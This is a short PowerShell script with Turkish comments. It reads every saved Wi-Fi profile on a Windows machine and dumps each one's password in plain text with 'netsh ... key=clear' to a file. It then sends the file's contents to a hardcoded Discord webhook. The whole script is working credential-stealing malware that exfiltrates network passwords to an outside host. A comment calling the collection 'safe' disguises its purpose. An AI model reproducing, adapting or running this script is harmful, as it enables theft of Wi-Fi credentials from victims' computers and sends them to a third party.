# Wi-Fi profillerini güvenli şekilde alalım
$profiles = netsh wlan show profiles | Where-Object { $_ -match 'All User Profile' } | ForEach-Object {
    $parts = $_ -split ':'
    if ($parts.Length -gt 1) {
        $parts[1].Trim()
    }
}

$outputFile = "$env:USERPROFILE\wifipass.txt"
if (Test-Path $outputFile) { Remove-Item $outputFile }

foreach ($profile in $profiles) {
    # Profil boş veya null ise atla
    if (![string]::IsNullOrEmpty($profile)) {
        netsh wlan show profile name="$profile" key=clear | Out-File -Append $outputFile
    }
}

# Webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN'

# Dosya içeriğini oku
$fileContent = Get-Content $outputFile -Raw

# JSON'da özel karakterlerden kaçalım
$escapedContent = $fileContent -replace '\\', '\\\\' -replace '"', '\"' -replace "`r`n", "`n"

# JSON payload'u elle oluştur
$payload = '{ "content": "```' + $escapedContent + '```" }'

# İsteği gönder
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
